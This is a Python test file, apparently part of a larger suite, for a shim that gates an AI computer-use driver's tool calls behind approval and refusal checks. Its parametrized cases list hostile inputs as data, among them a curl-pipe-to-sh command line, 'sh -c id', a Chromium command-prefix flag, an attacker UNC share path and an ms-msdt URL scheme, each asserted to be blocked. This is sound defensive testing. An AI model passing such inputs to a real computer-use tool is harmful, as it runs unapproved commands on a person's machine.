    (package / "__init__.py").write_text("raise RuntimeError('imported')\n", encoding="utf-8")
    name = "cua-driver.exe" if sys.platform == "win32" else "cua-driver"
    (package / "bin" / name).write_text("", encoding="utf-8")
    monkeypatch.syspath_prepend(str(tmp_path))
    monkeypatch.delitem(sys.modules, "cua_driver", raising=False)

    assert driver.find_driver_binary() == package / "bin" / name
    assert "cua_driver" not in sys.modules


def test_an_explicit_driver_in_the_current_folder_runs_from_there(
    tmp_path: Path, monkeypatch
) -> None:
    """Path dropped the `./` of `./cua-driver`, so the driver was started as
    a bare `cua-driver`, which the OS looks up on PATH: another install ran,
    or none did, in place of the file the shim had checked."""
    name = "cua-driver.exe" if sys.platform == "win32" else "cua-driver"
    (tmp_path / name).write_text("", encoding="utf-8")
    monkeypatch.chdir(tmp_path)

    found = driver.find_driver_binary(f"./{name}")

    assert found is not None and found.is_absolute()
    assert found.samefile(tmp_path / name)
    assert Path(driver.driver_argv(found, "direct")[0]).is_absolute()


async def test_a_driver_found_through_a_relative_path_entry_starts_in_its_own_folder(
    fake_log: Path, tmp_path: Path, monkeypatch
) -> None:
    """shutil.which keeps a relative PATH entry (`bin`) in the path it
    returns, and a Linux driver starts in an empty folder of its own, where
    `bin/cua-driver` names nothing: its start failed, and HELLO went on
    without computer use."""
    name = "cua-driver.exe" if sys.platform == "win32" else "cua-driver"
    (tmp_path / "bin").mkdir()
    binary = tmp_path / "bin" / name
    shutil.copyfile(FAKE, binary)
    binary.chmod(0o755)
    monkeypatch.chdir(tmp_path)
    monkeypatch.setenv("PATH", os.pathsep.join(["bin", os.environ.get("PATH", "")]))
    monkeypatch.setattr(driver, "bundled_binary", lambda: None)
    bridge = CuaDriverBridge(
        tools=catalog.offered_tools(enable_clipboard=False),
        platform="linux",
        client_factory=_fake_client,
    )

    try:
        snapshot = await bridge.snapshot()
    finally:
        await bridge.close()

    assert snapshot.tools
    found = driver.find_driver_binary()
    assert found is not None and found.is_absolute()
    assert found.samefile(binary)


def test_an_explicit_driver_path_that_cannot_be_expanded_is_not_found(monkeypatch) -> None:
    """Path.expanduser raises RuntimeError for `~someone` with no such
    account, or a home it can't find, and no caller of find_driver_binary
    caught it: the shim stopped at start instead of reporting cua-driver
    missing."""

    def no_home(self: Path) -> Path:
        raise RuntimeError("Could not determine home directory.")

    monkeypatch.setattr(driver.Path, "expanduser", no_home)

    assert driver.find_driver_binary("~nobody-here/cua-driver") is None


async def test_a_driver_is_looked_for_off_the_event_loop(fake_log: Path, monkeypatch) -> None:
    """A start looked for the driver on the event loop: the wheel's on
    sys.path, else one on PATH, then its execute bit, statting files in each
    folder on the way. A stalled mount there (NFS, FUSE) holds a stat for as
    long as it stalls, and held every session's work and keepalive with it."""
    loop_thread = threading.get_ident()
    seen: dict[str, list[int]] = {"find_driver_binary": [], "ensure_executable": []}
    for name in seen:
        real = getattr(driver, name)

        def watched(*args: Any, _real: Any = real, _name: str = name) -> Any:
            seen[_name].append(threading.get_ident())
            return _real(*args)

        monkeypatch.setattr(driver, name, watched)
    bridge = fake_bridge()

    try:
        snapshot = await bridge.snapshot()
    finally:
        await bridge.close()

    assert snapshot.tools
    for name, threads in seen.items():
        assert threads and loop_thread not in threads, name


async def test_a_look_for_the_driver_its_caller_gave_up_on_is_the_next_callers(
    fake_log: Path, monkeypatch
) -> None:
    """A look a stalled mount holds goes on in its thread once its caller
    gives up (a HELLO whose connection closed, a chat's start undone). One
    made again for each caller would stall too, until every worker thread
    the sessions' file work shares was held: the next caller waits for it."""
    started, released = threading.Event(), threading.Event()
    looks: list[int] = []
    find = driver.find_driver_binary

    def stalled(explicit: Any = None) -> Path | None:
        looks.append(threading.get_ident())
        started.set()
        released.wait(60)
        return find(explicit)

    monkeypatch.setattr(driver, "find_driver_binary", stalled)
    bridge = fake_bridge()
    first = asyncio.ensure_future(bridge.find_binary())
    try:
        assert await asyncio.to_thread(started.wait, 60)
        first.cancel()
        with pytest.raises(asyncio.CancelledError):
            await first
        second = asyncio.ensure_future(bridge.find_binary())
        await asyncio.sleep(0)  # as far as its wait for a look
        released.set()

        assert await asyncio.wait_for(second, 60) == FAKE.absolute()
        assert len(looks) == 1
    finally:
        released.set()
        await bridge.close()


# ── Catalog ──────────────────────────────────────────────────────────────


def test_the_policy_document_allows_exactly_the_offered_tools() -> None:
    tools = catalog.offered_tools(enable_clipboard=True)
    assert json.loads(catalog.policy_document(tools)) == {"allow": {"tools": sorted(tools)}}


def test_clipboard_tools_are_offered_only_when_enabled() -> None:
    assert not catalog.CLIPBOARD_TOOLS & catalog.offered_tools(enable_clipboard=False)
    assert catalog.CLIPBOARD_TOOLS <= catalog.offered_tools(enable_clipboard=True)


@pytest.mark.parametrize(
    ("tool", "arguments", "argument"),
    [
        ("get_window_state", {"pid": 1, "screenshot_out_file": "~/.bashrc"}, "screenshot_out_file"),
        ("get_desktop_state", {"screenshot_out_file": "/tmp/x.png"}, "screenshot_out_file"),
        # On a Mac the driver writes a screenshot there before it clicks.
        ("click", {"pid": 1, "window_id": 2, "x": 10, "y": 20,
                   "debug_image_out": "/Users/me/.zshrc"}, "debug_image_out"),
        ("clipboard_write", {"file_path": "/etc/passwd"}, "file_path"),
        ("clipboard_write", {"image_path": "/a.png"}, "image_path"),
        ("browser_set_input_files", {"ref": "p1:2", "files": ["/home/me/cv.pdf"]}, "files"),
        # The script's own calls run inside the driver, out of the shim's
        # sight, and can pass screenshot_out_file to get_window_state.
        ("run_script", {"script": "return 1"}, "script"),
        # The driver starts these out of sight, with no window of their own.
        ("launch_app", {"launch_path": "sh -c id"}, "launch_path"),
        ("launch_app", {"path": "C:\\Users\\me\\Downloads\\setup.exe"}, "path"),
        # A Chromium flag such as --renderer-cmd-prefix runs a command.
        ("launch_app", {"name": "Google Chrome",
                        "additional_arguments": ["--renderer-cmd-prefix=sh -c id"]},
         "additional_arguments"),
        # A file, a share or a URL scheme opens in whatever app handles it,
        # and a web page in the person's own, signed-in browser.
        ("launch_app", {"name": "Calculator", "urls": ["https://example.com"]}, "urls"),
        ("launch_app", {"bundle_id": "com.example.app", "webkit_inspector_port": 9222},
         "webkit_inspector_port"),
    ],
)  # fmt: skip
def test_arguments_that_reach_the_disk_wait_for_approval(
    tool: str, arguments: dict, argument: str
) -> None:
    # As on a Mac: a Windows bundle_id must also be an AUMID, which
    # test_a_windows_bundle_id_must_be_an_aumid covers.
    with pytest.raises(catalog.ApprovalRequired) as waiting:
        catalog.check_arguments(tool, arguments, platform="darwin")
    assert waiting.value.argument == argument

    catalog.check_arguments(tool, arguments, approved=[argument], platform="darwin")


@pytest.mark.parametrize(
    ("tool", "arguments", "approved", "argument"),
    [
        ("clipboard_write", {}, [], "text"),
        ("clipboard_write", {"text": "x", "image_path": "/a.png"}, ["image_path"], "text"),
        ("check_permissions", {"prompt": True}, [], "prompt"),
        # Only an argument that needs approval can be approved.
        ("click", {"pid": 1}, ["pid"], "pid"),
        ("get_window_state", {"pid": 1}, ["file_path"], "file_path"),
        (
            "run_steps",
            {"steps": [{"tool": "click", "args": {}}, {"tool": "get_window_state",
                       "args": {"screenshot_out_file": "/x"}}]},
            [],
            "steps[1].screenshot_out_file",
        ),
        (
            "run_steps",
            {"steps": [{"get_window_state": {"screenshot_out_file": "/x"}}]},
            [],
            "steps[0].screenshot_out_file",
        ),
        ("run_steps", {"steps": [{"run_script": {"script": "return 1"}}]}, [], "steps[0].script"),
        # A click on a Mac writes a screenshot to `debug_image_out`, and the
        # driver runs a `press` with a target, and a `triple_click` in any
        # case, as a click.
        (
            "run_steps",
            {"steps": [{"tool": "click", "args": {"debug_image_out": "/x"}}]},
            [],
            "steps[0].debug_image_out",
        ),
        (
            "run_steps",
            {"steps": [{"tool": "press", "args": {"pid": 1, "window_id": 2, "x": 1, "y": 1,
                                                  "debug_image_out": "/x"}}]},
            [],
            "steps[0].debug_image_out",
        ),
        (
            "run_steps",
            {"steps": [{"Triple_Click": {"pid": 1, "window_id": 2, "x": 1, "y": 1,
                                         "debug_image_out": "/x"}}]},
            [],
            "steps[0].debug_image_out",
        ),
        # A launch's name is checked against the installed apps only when
        # launch_app is called on its own.
        ("run_steps", {"steps": [{"tool": "launch_app", "args": {"name": "logoff"}}]}, [],
         "steps[0]"),
        ("run_steps", {"steps": [{"launch_app": {"name": "Calculator"}}]}, [], "steps[0]"),
        ("run_steps", {"steps": [{"tool": "Launch_App", "args": {}}]}, [], "steps[0]"),
        # Steps the shim can't look inside: a number stopped the check with a
        # TypeError, and the call went unaudited, and a string or an object
        # was read a character or a key at a time, none of them a step.
        ("run_steps", {"steps": 1}, [], "steps"),
        ("run_steps", {"steps": True}, [], "steps"),
        ("run_steps", {"steps": "click"}, [], "steps"),
        ("run_steps", {"steps": {"0": {"tool": "click", "args": {"debug_image_out": "/x"}}}}, [],
         "steps"),
        ("run_steps", {"steps": [{"tool": "click", "args": {"pid": 1}}, "garbage"]}, [],
         "steps[1]"),
        ("run_steps", {"steps": [{"tool": "run_steps", "args": {"steps": 1}}]}, [],
         "steps[0].steps"),
        # The driver runs `observe` as get_window_state, which writes the
        # screenshot to the file it names.
        (
            "run_steps",
            {"steps": [{"tool": "move_cursor", "args": {"x": 1, "y": 1}}],
             "observe": {"pid": 1, "window_id": 2, "screenshot_out_file": "/x"}},
            [],
            "observe.screenshot_out_file",
        ),
        # A launch that needs no approval names an app; a path, a share or a
        # URL scheme in its place runs whatever it points at.
        ("launch_app", {"name": "/home/me/Downloads/payload"}, [], "name"),
        ("launch_app", {"name": "C:\\Users\\me\\Downloads\\setup.exe"}, [], "name"),
        ("launch_app", {"name": "\\\\attacker\\share\\x.exe"}, [], "name"),
        ("launch_app", {"bundle_id": "ms-msdt:/id PCWDiagnostic"}, [], "bundle_id"),
        ("launch_app", {"aumid": "{6D809377-6AF0-444B-8957-A3773F02200E}\\app.exe"}, [],
         "aumid"),
        ("launch_app", {"name": "-n"}, [], "name"),
        ("launch_app", {"name": "Calculator\u202e"}, [], "name"),
        # Approving a path doesn't let `name` carry one.
        ("launch_app", {"name": "/bin/sh", "urls": ["https://example.com"]}, ["urls"], "name"),
    ],
)  # fmt: skip
def test_arguments_this_machine_never_takes_are_refused(
    tool: str, arguments: dict, approved: list[str], argument: str
) -> None:
    with pytest.raises(catalog.ArgumentRefused) as refused:
        catalog.check_arguments(tool, arguments, approved=approved)
    assert refused.value.argument == argument


@pytest.mark.parametrize(
    ("tool", "arguments"),
    [
        ("get_window_state", {"pid": 1, "screenshot_out_file": None}),
        ("get_window_state", {"pid": 1, "screenshot_out_file": ""}),
        ("clipboard_write", {"text": "hello"}),
        ("check_permissions", {"prompt": False}),
        (
            "run_steps",
            {"steps": [{"tool": "click", "args": {"pid": 1}}, {"wait_for": {"name": "Saved"}}]},
        ),
        ("launch_app", {"name": "Calculator"}),
        ("launch_app", {"name": "notepad.exe", "start_minimized": True}),
        ("launch_app", {"bundle_id": "com.apple.calculator"}),
        ("launch_app", {"aumid": "Microsoft.WindowsNotepad_8wekyb3d8bbwe!App"}),
    ],
)
def test_ordinary_arguments_pass(tool: str, arguments: dict) -> None:
    catalog.check_arguments(tool, arguments, platform="darwin")


@pytest.mark.parametrize(
    ("name", "programs", "refused"),
    [
        # cua-driver runs `sh` with the rest as its arguments: any command.
        ("sh -c curl${IFS}example.com|sh", {"sh"}, True),
        ("python3 -mhttp.server", {"python3"}, True),
        # A program's own name runs it, in the background: `reboot` restarts
        # the computer.
        ("reboot", {"reboot"}, True),
        ("firefox", {"firefox"}, True),
        # No program is called "Google" or "Firefox" (PATH is case-sensitive),
        # so the driver matches the app by its display name.
        ("Google Chrome", set(), False),
        ("Firefox", {"firefox"}, False),
    ],
)
def test_a_linux_launch_name_is_not_a_command_line(
    name: str, programs: set[str], refused: bool
) -> None:
    """On Linux cua-driver runs `name` as a command line split at spaces
    before it looks for an installed app of that name, so a name could run
    any program with any arguments without the approval launch_path needs,
    and a program's own name ran that program, with none."""

    def on_path(word: str) -> str | None:
        return f"/usr/bin/{word}" if word in programs else None

    def check(platform: str) -> None:
        catalog.check_arguments("launch_app", {"name": name}, platform=platform, on_path=on_path)

    if refused:
        with pytest.raises(catalog.ArgumentRefused) as caught:
            check("linux")
        assert caught.value.argument == "name"
    else:
        check("linux")
    # macOS and Windows look a name up; they never run it as a command line.
    check("darwin")
    check("win32")


def test_the_platform_never_sees_the_session_argument() -> None:
    schema = {
        "type": "object",
        "properties": {"session": {"type": "string"}, "pid": {"type": "integer"}},
        "required": ["session", "pid"],
    }

    shown = catalog.without_session(schema)

    assert shown == {
        "type": "object",
        "properties": {"pid": {"type": "integer"}},
        "required": ["pid"],
    }
    assert "session" in schema["properties"]


# ── Handler ──────────────────────────────────────────────────────────────


def _config(tmp_path: Path, **overrides: Any) -> ShimConfig:
    values: dict[str, Any] = {
        "allowed_root": tmp_path,
        "audit_log_path": tmp_path / "audit.log",
        "enable_computer_use": True,
        "session_id": "session-1",
    }
    values.update(overrides)
    return ShimConfig(**values)


@pytest.fixture
async def make_handler(tmp_path: Path, fake_log: Path):
    made: list[ComputerUseHandler] = []

    def make(platform: str = "linux", **overrides: Any) -> ComputerUseHandler:
        config = _config(tmp_path, **overrides)
        audit = AuditWriter(config.audit_log_path, b"a" * 32)
        handler = ComputerUseHandler(
            config,
            audit=audit,
            driver=CuaDriverBridge(
                tools=catalog.offered_tools(enable_clipboard=config.enable_clipboard),
                binary=FAKE,
                platform=platform,
                client_factory=_fake_client,
            ),
        )
        made.append(handler)
        return handler

    yield make
    for handler in made:
        await handler.close()


def _call(tool: str, arguments: dict | None = None, **payload: Any) -> ComputerToolCallMessage:
    return ComputerToolCallMessage(
        id=new_id(),
        ts=now_ts(),
        payload=ComputerToolCallPayload(tool=tool, arguments=arguments or {}, **payload),
    )


def _audit(tmp_path: Path) -> list[dict]:
    return [
        json.loads(line)
        for line in (tmp_path / "audit.log").read_text(encoding="utf-8").splitlines()
        if '"COMPUTER_TOOL_CALL"' in line
    ]


async def test_the_tool_list_carries_the_drivers_guidance_and_this_machines_rules(
    make_handler,
) -> None:
    handler = make_handler(max_screenshots_per_minute=7)

    response = await handler.handle(ComputerToolsRequestMessage(id=new_id(), ts=now_ts()))

    assert isinstance(response, ComputerToolsResponseMessage)
    payload = response.payload
    assert payload.driver.name == "cua-driver" and payload.driver.runtime == "direct"
    assert payload.instructions.startswith("Fake cua-driver guidance.")
    assert "at most 7 images" in payload.instructions
    assert "Clipboard tools are off" in payload.instructions
    names = {tool.name for tool in payload.tools}
    assert names == catalog.offered_tools(enable_clipboard=False)
    zoom = next(tool for tool in payload.tools if tool.name == "zoom")
    assert "session" not in zoom.input_schema["properties"]
    assert zoom.input_schema["required"] == []
    assert zoom.approval_arguments == {}
    assert "need approval on every call" in payload.instructions


async def test_the_tool_list_promises_no_prompt_for_an_approval(make_handler) -> None:
    """The guidance said disk arguments, scripts and launch arguments wait for
    the person's approval on every call. A chat that runs Unsupervised, or a
    standing rule the person set on an earlier card, approves without asking,
    so the model could tell the person to expect a prompt that never came."""
    handler = make_handler()

    response = await handler.handle(ComputerToolsRequestMessage(id=new_id(), ts=now_ts()))

    assert isinstance(response, ComputerToolsResponseMessage)
    instructions = response.payload.instructions
    assert "wait for the person's approval" not in instructions
    assert "unless the chat runs Unsupervised or a standing rule" in instructions


async def test_the_tool_list_names_the_arguments_that_need_approval(make_handler) -> None:
    handler = make_handler(enable_clipboard=True)

    response = await handler.handle(ComputerToolsRequestMessage(id=new_id(), ts=now_ts()))

    assert isinstance(response, ComputerToolsResponseMessage)
    approval = {
        tool.name: sorted(tool.approval_arguments)
        for tool in response.payload.tools
        if tool.approval_arguments
    }
    assert approval == {
        "browser_set_input_files": ["files"],
        "click": ["debug_image_out"],
        "clipboard_write": ["file_path", "image_path"],
        "get_desktop_state": ["screenshot_out_file"],
        "get_window_state": ["screenshot_out_file"],
        "launch_app": [
            "additional_arguments",
            "launch_path",
            "path",
            "urls",
            "webkit_inspector_port",
        ],
        "run_script": ["script"],
    }


async def test_a_click_that_saves_a_screenshot_waits_for_approval(make_handler, fake_log) -> None:
    """On a Mac cua-driver 0.38's click takes `debug_image_out` and writes a
    screenshot of the window to that path before it clicks: over any file
    the person can write, with no card asking first."""
    handler = make_handler(platform="darwin")
    arguments = {"pid": 1, "window_id": 2, "x": 10, "y": 20, "debug_image_out": "/Users/me/.zshrc"}

    waiting = await handler.handle(_call("click", dict(arguments)))
    approved = await handler.handle(
        _call("click", dict(arguments), approved_arguments=["debug_image_out"])
    )

    assert isinstance(waiting, ErrorMessage)
    assert waiting.payload.code == ErrorCode.APPROVAL_REQUIRED
    assert waiting.payload.details == {"tool": "click", "argument": "debug_image_out"}
    assert isinstance(approved, ComputerToolResultMessage)
    [call] = _records(fake_log, "call")
    assert call["arguments"]["debug_image_out"] == "/Users/me/.zshrc"


async def test_a_launch_that_runs_a_command_line_waits_for_approval(make_handler, fake_log) -> None:
    """cua-driver starts a launch_path or a program with extra arguments in
    the background, with no window of its own, so a launch ran any command
    with no more than the supervisor's say in Auto."""
    handler = make_handler()
    arguments = {"launch_path": "sh -c id"}

    waiting = await handler.handle(_call("launch_app", arguments))
    approved = await handler.handle(
        _call("launch_app", arguments, approved_arguments=["launch_path"])
    )

    assert isinstance(waiting, ErrorMessage)
    assert waiting.payload.code == ErrorCode.APPROVAL_REQUIRED
    assert waiting.payload.details == {"tool": "launch_app", "argument": "launch_path"}
    assert isinstance(approved, ComputerToolResultMessage)
    [call] = _records(fake_log, "call")
    assert call["arguments"]["launch_path"] == "sh -c id"


async def test_a_call_is_relayed_with_this_sessions_label(make_handler, fake_log, tmp_path) -> None:
    handler = make_handler()

    response = await handler.handle(_call("type_text", {"pid": 5, "text": "hunter2"}))

    assert isinstance(response, ComputerToolResultMessage)
    assert response.payload.tool == "type_text"
    assert response.payload.is_error is False
    [call] = _records(fake_log, "call")
    assert call["arguments"] == {"pid": 5, "text": "hunter2", "session": handler.session_label}
    assert handler.session_label.startswith("autogpt-")
    # What was typed stays out of the audit log.
    [record] = _audit(tmp_path)
    assert record["details"]["arguments"]["text"] == {"redacted_chars": 7}
    assert "hunter2" not in (tmp_path / "audit.log").read_text(encoding="utf-8")
    assert record["result"]["ok"] is True


async def test_the_platform_cannot_choose_the_session(make_handler, fake_log) -> None:
    handler = make_handler()

    await handler.handle(_call("click", {"pid": 5, "session": "someone-else"}))

    [call] = _records(fake_log, "call")
    assert call["arguments"]["session"] == handler.session_label


async def test_a_session_the_driver_ended_goes_on_under_a_new_label(
    make_handler, fake_log, monkeypatch
) -> None:
    # cua-driver ends a named session left idle for five minutes and refuses
    # every later call naming it.
    handler = make_handler()
    ended = handler.session_label
    monkeypatch.setenv("FAKE_CUA_ENDED_SESSIONS", ended)

    first = await handler.handle(_call("click", {"pid": 5}))
    second = await handler.handle(_call("click", {"pid": 6}))

    for response in (first, second):
        assert isinstance(response, ComputerToolResultMessage)
        assert response.payload.is_error is False
    calls = _records(fake_log, "call")
    assert [call["arguments"]["session"] for call in calls] == [ended, f"{ended}.1", f"{ended}.1"]
    assert [call["arguments"]["pid"] for call in calls] == [5, 5, 6]
    assert handler.session_label == f"{ended}.1"


async def test_hellos_screen_size_survives_an_ended_session(
    make_handler, fake_log, monkeypatch
) -> None:
    handler = make_handler()
    monkeypatch.setenv("FAKE_CUA_ENDED_SESSIONS", handler.session_label)

    assert await handler.screen_size() == (1920, 1080)


async def test_a_renewed_session_waits_no_longer_than_the_call_would(
    make_handler, fake_log, monkeypatch
) -> None:
    """The call that goes again under a new label got only what was left of
    its timeout, not of its start window: when another chat's call took the
    shared driver in between, a child's HELLO screen size or permission
    check waited for it up to its whole timeout (10 s, 30 s), past the
    platform's wait for the session to connect, instead of giving up as the
    first call would have."""
    handler = make_handler()
    monkeypatch.setenv("FAKE_CUA_ENDED_SESSIONS", handler.session_label)
    bridge = handler.driver
    await bridge.snapshot()  # running already: the first try needs no start
    real_call_tool = bridge.call_tool
    calls = 0

    async def call_tool(name, arguments, **kwargs):
        nonlocal calls
        calls += 1
        result = await real_call_tool(name, arguments, **kwargs)
        if calls == 1:
            await bridge._turn.acquire()  # another chat's call takes the driver
        return result

    monkeypatch.setattr(bridge, "call_tool", call_tool)
    try:
        renewed = handler.call_driver(
            "get_screen_size", {"session": handler.session_label}, timeout=60, start_within=0.5
        )
        with pytest.raises(driver.CallNotStarted):
            await asyncio.wait_for(renewed, timeout=20)
    finally:
        if bridge._turn.locked():
            bridge._turn.release()

    assert calls == 2


async def test_a_spent_start_window_still_reaches_a_free_driver(make_handler, fake_log) -> None:
    """The start window bounds the wait for the driver's turn and its start.
    A call with none of it left, but with the driver running and free, goes
    ahead: the look at the desktop's display it makes first is no wait, and
    is bounded by the call's own deadline."""
    handler = make_handler()
    await handler.driver.snapshot()

    raw = await handler.call_driver(
        "get_screen_size", {"session": handler.session_label}, timeout=30, start_within=0
    )

    assert raw["structuredContent"]["width"] == 1920


async def test_a_refusal_for_another_reason_is_not_sent_again(
    make_handler, fake_log, monkeypatch
) -> None:
    handler = make_handler()
    label = handler.session_label
    monkeypatch.setenv("FAKE_CUA_ENDED_SESSIONS", "autogpt-someone-else")

    response = await handler.handle(_call("click", {"pid": 5}))

    assert isinstance(response, ComputerToolResultMessage)
    [call] = _records(fake_log, "call")
    assert call["arguments"]["session"] == label == handler.session_label


async def test_sessions_get_their_own_labels(make_handler) -> None:
    assert make_handler(session_id="a").session_label != make_handler(session_id="b").session_label


def _ended_refusal(session: str) -> dict[str, Any]:
    """cua-driver 0.38's refusal of a call naming a session it ended."""
    message = f"session '{session}' has ended"
    return {
        "isError": True,
        "content": [{"type": "text", "text": message}],
        "structuredContent": {
            "refusal": {"code": "session_ended", "message": message},
            "status": "refused",
        },
    }


def _ending_sessions(bridge: CuaDriverBridge, monkeypatch) -> set[str]:
    """Have the bridge's driver refuse, as ended, the labels in the returned
    set, which a test adds to as the driver would end them: one that stays
    up keeps refusing them until it restarts."""
    ended: set[str] = set()
    real_call_tool = bridge.call_tool

    async def call_tool(name: str, arguments: dict[str, Any], **kwargs: Any) -> dict[str, Any]:
        if arguments.get("session") in ended:
            return _ended_refusal(arguments["session"])
        return await real_call_tool(name, arguments, **kwargs)

    monkeypatch.setattr(bridge, "call_tool", call_tool)
    return ended


async def test_a_chats_next_session_goes_on_from_the_label_its_last_one_reached(
    make_handler, fake_log, monkeypatch
) -> None:
    """Each child session's handler counted its label's renewals from zero,
    though the driver it shares outlives it. After two idle detaches the
    driver had ended both a chat's label and its `.1`; the chat's next
    session tried those two in turn, and the second refusal came back,
    since call_driver renews once."""
    parent = make_handler(session_id=None)
    ended = _ending_sessions(parent.driver, monkeypatch)
    labels: list[str] = []
    for _ in range(3):
        chat = make_handler(session_id="chat")  # the chat's session, attached again
        parent.share_with(chat)
        raw = await chat.call_driver("get_screen_size", {"session": chat.session_label}, timeout=60)
        assert not raw.get("isError"), raw
        labels.append(chat.session_label)
        # Left idle: the driver ends the label, then the session is detached.
        ended.add(chat.session_label)

    assert labels == [labels[0], f"{labels[0]}.1", f"{labels[0]}.2"]


async def test_the_machine_keeps_the_renewals_of_its_latest_renewed_chats(
    make_handler, monkeypatch
) -> None:
    """The renewals last as long as the driver, so they are bounded: a chat
    renewed less recently than MAX_RENEWED_LABELS others starts from its
    first label again."""
    from autogpt_local_executor import handlers

    monkeypatch.setattr(handlers, "MAX_RENEWED_LABELS", 2)
    parent = make_handler(session_id=None)
    chats = [make_handler(session_id=name) for name in ("a", "b", "c")]
    firsts = [chat.session_label for chat in chats]
    for chat in chats:
        parent.share_with(chat)

    for renewed in (0, 1, 0, 2):  # b is then the least recently renewed
        chats[renewed]._renew_label()

    assert [chat.session_label for chat in chats] == [
        f"{firsts[0]}.2",
        firsts[1],
        f"{firsts[2]}.1",
    ]


async def test_the_drivers_own_error_comes_back_as_a_result(make_handler) -> None:
    handler = make_handler()

    response = await handler.handle(_call("zoom", {"pid": -1}))

    assert isinstance(response, ComputerToolResultMessage)
    assert response.payload.is_error is True
    assert response.payload.structured_content == {"code": "stale"}


@pytest.mark.parametrize(
    ("bundle_id", "platform", "refused"),
    [
        ("com.apple.calculator", "win32", True),
        ("logoff", "win32", True),
        ("a!b!c", "win32", True),
        ("!App", "win32", True),
        ("Microsoft.WindowsNotepad_8wekyb3d8bbwe!App", "win32", False),
        ("com.apple.calculator", "darwin", False),
    ],
)
def test_a_windows_bundle_id_must_be_an_aumid(bundle_id: str, platform: str, refused: bool) -> None:
    """On Windows cua-driver 0.38 launches a bundle_id that is an AUMID
    (`Package!App`) as a packaged app and hands anything else to
    ShellExecuteEx as a program name, without looking for an installed app:
    `logoff` signed the person out, unasked."""

    def check() -> None:
        catalog.check_arguments(
            "launch_app", {"bundle_id": bundle_id}, platform=platform, on_path=lambda _: None
        )

    if refused:
        with pytest.raises(catalog.ArgumentRefused) as caught:
            check()
        assert caught.value.argument == "bundle_id"
    else:
        check()


@pytest.mark.parametrize(
    ("name", "matches"),
    [
        ("Notepad", True),
        ("notepad", True),
        ("NOTEPAD.EXE", True),
        (" Google ", True),
        ("goog", True),
        ("logoff", False),
        ("shutdown.exe", False),
        ("", False),
        (".exe", False),
    ],
)
def test_a_windows_launch_name_matches_as_the_driver_matches(name: str, matches: bool) -> None:
    """cua-driver 0.38 on Windows: the exact name ignoring case and a
    trailing `.exe`, else the shortest installed name starting with it."""
    assert catalog.windows_app_name_matches(name, ["Notepad", "Google Chrome"]) is matches


async def test_a_windows_launch_by_a_name_no_app_has_never_reaches_the_driver(
    make_handler, fake_log, monkeypatch
) -> None:
    """With no installed app of that name, cua-driver hands the name to
    ShellExecuteEx, which runs a program of that name from PATH, out of
    sight: `logoff` would sign the person out, unasked. A running process
    of that name, which no installed app matched, doesn't count."""
    monkeypatch.setenv("FAKE_CUA_APPS", json.dumps(["Notepad", "Google Chrome"]))
    handler = make_handler(platform="win32")

    response = await handler.handle(_call("launch_app", {"name": "logoff"}))

    assert isinstance(response, ErrorMessage)
    assert response.payload.code == ErrorCode.FEATURE_NOT_SUPPORTED
    assert response.payload.details == {"tool": "launch_app", "argument": "name"}
    assert [call["tool"] for call in _records(fake_log, "call")] == ["list_apps"]


async def test_a_windows_launch_by_an_installed_apps_name_goes_ahead(
    make_handler, fake_log, monkeypatch
) -> None:
    monkeypatch.setenv("FAKE_CUA_APPS", json.dumps(["Notepad", "Google Chrome"]))
    handler = make_handler(platform="win32")

    first = await handler.handle(_call("launch_app", {"name": "notepad.exe"}))
    second = await handler.handle(_call("launch_app", {"name": "Goog"}))

    for response in (first, second):
        assert isinstance(response, ComputerToolResultMessage)
        assert response.payload.is_error is False
    # The installed apps are listed for each launch by name.
    assert [call["tool"] for call in _records(fake_log, "call")] == [
        "list_apps",
        "launch_app",
        "list_apps",
        "launch_app",
    ]


@pytest.mark.parametrize(
    ("platform", "name"),
    [
        ("win32", "logoff"),
        ("win32", "Notepad"),
        ("linux", ".bash_history"),
        ("linux", "Zebra Notes"),
    ],
)
async def test_a_launch_in_a_batch_never_reaches_the_driver(
    make_handler, fake_log, monkeypatch, platform: str, name: str
) -> None:
    """A launch by name goes ahead only once an installed app has the name,
    which was checked only for a launch_app called on its own: a run_steps
    step that launched went to the driver unchecked, and only the driver's
    own list of what a batch may run, which has no launch_app, kept the name
    from ShellExecuteEx (`logoff`) or xdg-open. The step is refused now,
    whatever it names, before the driver hears of it."""
    apps: list = (
        ["Notepad"]
        if platform == "win32"
        else [{"name": "Zebra Notes", "bundle_id": "org.example.ZebraNotes"}]
    )
    monkeypatch.setenv("FAKE_CUA_APPS", json.dumps(apps))
    handler = make_handler(platform=platform)
    click = {"tool": "click", "args": {"pid": 1, "x": 1, "y": 1}}

    for step in ({"tool": "launch_app", "args": {"name": name}}, {"launch_app": {"name": name}}):
        response = await handler.handle(_call("run_steps", {"steps": [click, step]}))

        assert isinstance(response, ErrorMessage)
        assert response.payload.code == ErrorCode.FEATURE_NOT_SUPPORTED
        assert response.payload.details == {"tool": "run_steps", "argument": "steps[1]"}
    assert _records(fake_log, "call") == []


@pytest.mark.parametrize("platform", ["win32", "linux"])
async def test_a_launch_name_is_refused_when_the_apps_cannot_be_listed(
    make_handler, fake_log, monkeypatch, platform: str
) -> None:
    monkeypatch.setenv("FAKE_CUA_LIST_APPS_ERROR", "the shell did not answer")
    handler = make_handler(platform=platform)

    response = await handler.handle(_call("launch_app", {"name": "Notepad"}))

    assert isinstance(response, ErrorMessage)
    assert response.payload.code == ErrorCode.FEATURE_NOT_SUPPORTED
    assert [call["tool"] for call in _records(fake_log, "call")] == ["list_apps"]


@pytest.mark.parametrize(
    ("platform", "arguments", "approved"),
    [
        ("win32", {"name": "logoff", "aumid": "Microsoft.WindowsNotepad_8wekyb3d8bbwe!App"}, []),
        (
            "win32",
            {"name": "logoff", "bundle_id": "Microsoft.WindowsNotepad_8wekyb3d8bbwe!App"},
            [],
        ),
        ("linux", {"name": "invoice.pdf", "launch_path": "zebra-notes"}, ["launch_path"]),
        ("linux", {"name": "invoice.pdf", "urls": ["https://example.com"]}, ["urls"]),
        ("darwin", {"name": "Calculator"}, []),
    ],
    ids=["windows-aumid", "windows-aumid-bundle-id", "linux-launch-path", "linux-urls", "macos"],
)
async def test_a_launch_the_name_lookup_doesnt_decide_lists_no_apps(
    make_handler, fake_log, monkeypatch, platform: str, arguments: dict, approved: list
) -> None:
    """An AUMID wins over the name in cua-driver's routing on Windows, and
    on Linux links to open and then a launch_path do; macOS looks a name up
    among its apps and goes no further."""
    monkeypatch.setenv("FAKE_CUA_APPS", json.dumps(["Notepad"]))
    handler = make_handler(platform=platform)

    response = await handler.handle(_call("launch_app", arguments, approved_arguments=approved))

    assert isinstance(response, ComputerToolResultMessage)
